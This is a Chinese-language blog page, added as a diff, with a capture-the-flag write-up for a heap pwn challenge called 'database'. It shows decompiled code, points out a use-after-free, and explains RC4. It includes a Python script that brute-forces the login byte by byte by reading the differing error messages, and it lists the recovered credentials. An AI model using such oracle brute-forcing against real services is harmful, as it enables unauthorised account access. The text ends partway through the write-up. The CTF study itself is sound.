@@ -1,0 +1,2030 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+    
+    <meta name="description" content="">
+    <meta name="description" content="题目分析Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。 爆破用户名和密码这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目里能有什么提示，还是当时队里做逆向的师傅搞定的。观察发现，函数比较输入的逻辑比较奇怪。先调用了一个自己实现的strcmp，这里对我们的用户输入调用了strlen，然后按照用户输入的长度去比较： 1234567">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How2Heap实战——网鼎杯database wp">
+<meta property="og:url" content="http://example.com/2024/11/10/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E7%BD%91%E9%BC%8E%E6%9D%AFdatabase-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="题目分析Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。 爆破用户名和密码这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目里能有什么提示，还是当时队里做逆向的师傅搞定的。观察发现，函数比较输入的逻辑比较奇怪。先调用了一个自己实现的strcmp，这里对我们的用户输入调用了strlen，然后按照用户输入的长度去比较： 1234567">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-10T15:29:18.000Z">
+<meta property="article:modified_time" content="2024-11-14T11:57:33.270Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>How2Heap实战——网鼎杯database wp · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">How2Heap实战——网鼎杯database wp</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                How2Heap实战——网鼎杯database wp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/11/10</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>Glibc2.27，64位保护全开，沙箱ban掉了execve和execveat，打orw。</p>
+<h2 id="爆破用户名和密码"><a href="#爆破用户名和密码" class="headerlink" title="爆破用户名和密码"></a>爆破用户名和密码</h2><p>这个程序上来先在远程打开了用户名和密码的文件要我们输入，找了半天没找到题目里能有什么提示，还是当时队里做逆向的师傅搞定的。观察发现，函数比较输入的逻辑比较奇怪。先调用了一个自己实现的strcmp，这里对我们的用户输入调用了strlen，然后按照用户输入的长度去比较：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != a2[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>中间有不一样的就返回“Invalid username”，而如果全一样再去比较用户输入和指定用户名&#x2F;密码的长度，不一样再输出”Invalid password”.这两种不同的回显加上源程序死循环调用的特性，让我们可以轻易的利用这一点去对用户名和密码进行爆破</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">    input(<span class="number">0</span>, s, <span class="number">0x10</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)my_strcmp(s, ptr) )<span class="comment">// 对我们的输入调了strlen，\0绕过？</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>下面是这个逐字节爆破的思路：让char从0到0xFF遍历，成功了（回显不一样）就加到发送内容的后面：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crack_username</span>():</span><br><span class="line">    username = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=username + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid username!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid username length!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Username correct!\n&#x27;</span>):</span><br><span class="line">                username += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(username)</span><br><span class="line">                <span class="keyword">return</span> username</span><br><span class="line"><span class="comment"># 4dm1n</span></span><br><span class="line"><span class="comment"># 985da4f8cb37zkj</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_password</span>():</span><br><span class="line">    password=<span class="string">b&#x27;985da4f8cb37zkj&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span>(char == <span class="number">10</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            crack=password + char.to_bytes()</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your username:&#x27;</span>, <span class="string">b&#x27;4dm1n&#x27;</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">b&#x27;Input your password:&#x27;</span>, crack)</span><br><span class="line">            p.recvline()</span><br><span class="line">            result=p.recvline()</span><br><span class="line">            <span class="keyword">if</span>(result==<span class="string">b&#x27;Invalid password!\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Invalid password length!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(result==<span class="string">b&#x27;Password correct!\n&#x27;</span>):</span><br><span class="line">                password += char.to_bytes()</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">return</span> password</span><br></pre></td></tr></table></figure>
+<h2 id="控制流与加密"><a href="#控制流与加密" class="headerlink" title="控制流与加密"></a>控制流与加密</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( input_10() )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    save_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    delete_data();                <span class="comment">// UAF here</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    edit_data();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>增查删改，程序允许通过exit函数退出。指针和size在全局变量数组里管理，可以看到free存在UAF漏洞：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete_data</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = input_10();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)chunks[<span class="number">2</span> * v2 + <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    encrypt1(byte_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">    encrypt2(byte_203180, ptr, LODWORD(chunks[<span class="number">2</span> * v2]));</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序还有一个点是加密，这是一个用了密钥的对称加密。对常见的加密算法不是很熟所以当时放弃了，其实这是一个rc4。</p>
+<blockquote>
+<p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。由于异或运算的对合性，RC4加密解密使用同一套算法。</p>
+</blockquote>
+<p>下面就是一个典型的rc4加密算法初始化的过程，一般初始化要包含三个参数：Sbox数组，密钥，密钥的长度。</p>
+<ol>
+<li>初始化存储0-255字节的Sbox(其实就是一个数组)</li>
+<li>填充key到256个字节数组中称为Tbox(你输入的key不满256个字节则初始化到256个字节)</li>
+<li>交换s[i]与s[j] i 从0开始一直到255下标结束. j是 s[i]与T[i]组合得出的下标。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">encrypt1</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *key, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+27h] [rbp-119h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-118h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE v8[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    v8[i] = key[i % a3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">255</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = ((<span class="type">char</span>)v8[j] + v7 + (<span class="type">unsigned</span> __int8)a1[j]) % <span class="number">256</span>;</span><br><span class="line">    v4 = a1[j];</span><br><span class="line">    a1[j] = a1[v7];</span><br><span class="line">    a1[v7] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>初始化s盒后就是加密了。加密同样接受三个参数：初始化好的sbox，待加密的明文，以及明文长度。</p>
